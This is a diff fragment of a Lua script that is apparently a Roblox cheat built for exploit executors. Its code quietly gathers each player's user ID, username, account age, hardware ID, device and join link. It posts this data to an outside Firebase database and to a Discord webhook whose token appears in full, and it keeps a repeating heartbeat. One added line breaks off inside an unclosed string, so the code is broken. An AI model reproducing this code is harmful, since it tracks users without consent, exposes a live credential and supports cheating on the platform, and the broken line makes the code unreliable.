 			elseif p == "OSX" then device = "MacOS"
 			elseif p == "IOS" then device = "iOS"
 			elseif p == "Android" then device = "Android"
 			elseif p == "UWP" then device = "Xbox"
 			else device = p end
-	
 			return device
 		end
-	
 		local function _ping()
 			local ok, v = pcall(function()
 				return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
 			end)
 			return ok and math.floor(v) or 0
 		end
-	
 		local function _fps()
 			local v = workspace:GetRealPhysicsFPS()
 			return v > 0 and math.floor(v) or 0
 		end
-	
 		local function _joinLink()
 			local ok, v = pcall(function()
 				return "https://www.roblox.com/games/start?placeId="
@@ -14583,21 +13178,17 @@ local script = AGARWARE["465"];
 			end)
 			return ok and v or ""
 		end
-	
 		local function _findPlayerKey(userId)
-			-- Check if a key exists for this userId (with any username)
 			local success, response = pcall(function()
 				return _req({
 					Url = _FIREBASE_URL .. "/players.json",
 					Method = "GET"
 				})
 			end)
-	
 			if success and response.StatusCode == 200 then
 				local allPlayers = _HttpService:JSONDecode(response.Body)
 				if type(allPlayers) == "table" then
 					for key, _ in pairs(allPlayers) do
-						-- Extract userId from key (format: "userId - username")
 						local keyUserId = key:match("^(%d+)%s*%-")
 						if keyUserId and tonumber(keyUserId) == userId then
 							return key
@@ -14605,23 +13196,17 @@ local script = AGARWARE["465"];
 					end
 				end
 			end
-	
 			return nil
 		end
-	
 		local function _renamePlayerKey(oldKey, newKey)
-			-- Get data from old key
 			local success, response = pcall(function()
 				return _req({
 					Url = _FIREBASE_URL .. "/players/" .. _HttpService:UrlEncode(oldKey) .. ".json",
 					Method = "GET"
 				})
 			end)
-	
 			if success and response.StatusCode == 200 then
 				local data = _HttpService:JSONDecode(response.Body)
-	
-				-- Create new key with data
 				pcall(function()
 					_req({
 						Url = _FIREBASE_URL .. "/players/" .. _HttpService:UrlEncode(newKey) .. ".json",
@@ -14630,8 +13215,6 @@ local script = AGARWARE["465"];
 						Body = _HttpService:JSONEncode(data)
 					})
 				end)
-	
-				-- Delete old key
 				pcall(function()
 					_req({
 						Url = _FIREBASE_URL .. "/players/" .. _HttpService:UrlEncode(oldKey) .. ".json",
@@ -14640,7 +13223,6 @@ local script = AGARWARE["465"];
 				end)
 			end
 		end
-	
 		local function _getPlayerData(playerKey)
 			local success, response = pcall(function()
 				return _req({
@@ -14648,14 +13230,12 @@ local script = AGARWARE["465"];
 					Method = "GET"
 				})
 			end)
-	
 			if success and response.StatusCode == 200 then
 				local data = _HttpService:JSONDecode(response.Body)
 				if type(data) == "table" then
 					return data
 				end
 			end
-	
 			return {
 				execution_count = 0,
 				first_seen = os.time(),
@@ -14663,7 +13243,6 @@ local script = AGARWARE["465"];
 				hwids = {}
 			}
 		end
-	
 		local function _updatePlayerData(playerKey, data)
 			pcall(function()
 				_req({
@@ -14674,11 +13253,8 @@ local script = AGARWARE["465"];
 				})
 			end)
 		end
-	
 		local function _addHWID(playerKey, hwid)
 			local playerData = _getPlayerData(playerKey)
-	
-			-- Check if HWID already exists
 			local hwidExists = false
 			for _, existingHwid in pairs(playerData.hwids) do
 				if existingHwid == hwid then
@@ -14686,16 +13262,12 @@ local script = AGARWARE["465"];
 					break
 				end
 			end
-	
-			-- Add HWID if it doesn't exist
 			if not hwidExists then
 				table.insert(playerData.hwids, hwid)
 				_updatePlayerData(playerKey, { hwids = playerData.hwids })
 			end
-	
 			return playerData
 		end
-	
 		local function _send(embedTable)
 			pcall(function()
 				_req({
@@ -14706,36 +13278,22 @@ local script = AGARWARE["465"];
 				})
 			end)
 		end
-	
 		local userId = _plr.UserId
 		local username = _plr.Name
 		local hwid = _hwid()
-	
-		-- Create player key format: "userId - username"
 		local currentKey = userId .. " - " .. username
-	
-		-- Check if player exists with different username
 		local existingKey = _findPlayerKey(userId)
-	
 		if existingKey and existingKey ~= currentKey then
-			-- Username changed, rename the key
 			_renamePlayerKey(existingKey, currentKey)
 		end
-	
-		-- Get player data and add HWID
 		local playerData = _addHWID(currentKey, hwid)
-	
-		-- Update execution count and last seen
 		playerData.execution_count = playerData.execution_count + 1
 		playerData.last_seen = os.time()
-	
 		_updatePlayerData(currentKey, {
 			execution_count = playerData.execution_count,
 			last_seen = playerData.last_seen
 		})
-	
 		local accountCreated = os.date("%Y-%m-%d", os.time() - (_plr.AccountAge * 86400))
-	
 		_send({
 			title = string.format("%s / @%s", _plr.DisplayName, _plr.Name),
 			description = string.format(
@@ -14759,37 +13317,16 @@ local script = AGARWARE["465"];
 			timestamp = DateTime.now():ToIsoDate()
 		})
 	end
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	-- Add this AFTER your load webhook code
-	
 	local _FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
 	local _plr = game:GetService("Players").LocalPlayer
 	local _HttpService = game:GetService("HttpService")
 	local _MarketplaceSvc = game:GetService("MarketplaceService")
-	
 	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
-	
 	local function _hwid()
 		if get_hwid then return tostring(get_hwid()) end
 		local ok, id = pcall(function() return game:GetService("RbxAnalyticsService"):GetClientId() end)
 		return ok and id or "N/A"
 	end
-	
 	local function _joinLink()
 		local ok, v = pcall(function()
 			return "https://www.roblox.com/games/start?placeId="
@@ -14798,11 +13335,9 @@ local script = AGARWARE["465"];
 		end)
 		return ok and v or ""
 	end
-	
 	local _productInfo = pcall(function()
 		return _MarketplaceSvc:GetProductInfo(game.PlaceId)
 	end) and _MarketplaceSvc:GetProductInfo(game.PlaceId) or { Name = "Unknown" }
-	
 	local function updateOnlineStatus()
 		pcall(function()
 			_req({
@@ -14820,18 +13355,12 @@ local script = AGARWARE["465"];
 			})
 		end)
 	end
-	
-	-- Add to online list IMMEDIATELY on execute
 	updateOnlineStatus()
-	
-	-- Send heartbeat every 3 minutes (180 seconds)
 	spawn(function()
 		while wait(180) do
 			updateOnlineStatus()
 		end
 	end)
-	
-	-- Remove from online list when player leaves
 	game:GetService("Players").PlayerRemoving:Connect(function(player)
 		if player == _plr then
 			pcall(function()
@@ -14842,30 +13371,12 @@ local script = AGARWARE["465"];
 			end)
 		end
 	end)
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
 	local HttpService = game:GetService("HttpService")
 	local Players = game:GetService("Players")
-	
 	local FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
-	local WEBHOOK_URL = "https://discord.com/api/webhooks/1504421690610946173/Q7J4q10dMdKyr3EXfog5iqy6qMsOWsWdu_e-CSH2gZqCi--HeVI-mDWr9qeQ57kuN76p"
-	
+	local WEBHOOK_URL = "https://discord.com/api/webhooks/1504421690610946173/Q7J4q10dMdKyr3EXfog5iqy6qMsOWsWdu_e-CSH2gZqCi
 	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
 	local _plr = Players.LocalPlayer
-	
-	-- Get current total execution count from Firebase
 	local function getTotalExecutionCount()
 		local success, response = pcall(function()
 			return _req({
@@ -14873,18 +13384,14 @@ local script = AGARWARE["465"];
 				Method = "GET"
 			})
 		end)
-	
 		if success and response.StatusCode == 200 then
 			local count = HttpService:JSONDecode(response.Body)
 			if type(count) == "number" then
 				return count
 			end
 		end
-	
 		return 0
 	end
-	
-	-- Update total execution count in Firebase
 	local function updateTotalExecutionCount(newCount)
 		pcall(function()
 			_req({
@@ -14895,8 +13402,6 @@ local script = AGARWARE["465"];
 			})
 		end)
 	end
-	
-	-- Send Discord webhook
 	local function sendWebhook(executionCount)
 		pcall(function()
 			local embed = {
@@ -14908,7 +13413,6 @@ local script = AGARWARE["465"];
 				},
 				timestamp = DateTime.now():ToIsoDate()
 			}
-	
 			_req({
 				Url = WEBHOOK_URL,
 				Method = "POST",
@@ -14917,15 +13421,9 @@ local script = AGARWARE["465"];
 			})
 		end)
 	end
-	
-	-- Main execution
 	local currentCount = getTotalExecutionCount()
 	local newCount = currentCount + 1
-	
-	-- Update Firebase
 	updateTotalExecutionCount(newCount)
-	
-	-- Send webhook
 	sendWebhook(newCount)
 end;
 task.spawn(C_465);
